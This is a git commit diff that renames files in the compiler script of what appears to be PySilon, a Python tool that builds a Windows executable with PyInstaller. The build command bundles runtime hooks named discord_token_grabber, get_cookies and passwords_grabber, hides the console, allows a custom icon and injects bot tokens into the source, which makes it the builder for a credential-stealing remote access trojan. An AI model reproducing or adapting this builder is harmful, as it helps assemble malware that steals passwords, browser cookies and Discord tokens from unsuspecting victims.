b9465b37445ece757d388986d3fb4b9933476fcd
Mateusz Gołembowski <44233157+mategol@users.noreply.github.com>
2023-01-03 00:28:51 +0100

    Abandon the old compiler.py and work on a new one

--- compiler_obsolete.py
+++ compiler_obsolete.py
@@ -64,12 +64,11 @@ else:
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
 
-pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
-# Uncomment if you want to use pre-downloaded PyInstaller #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"obsolete_main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
-with open('main.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
-with open('main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
+with open('main_obsolete.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
+with open('obsolete_main_prepared.py', 'w', encoding='utf-8') as edit_source_code:
     for line in source_code:
         if mode == 1:
             if line.startswith('bot_tokens'): edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
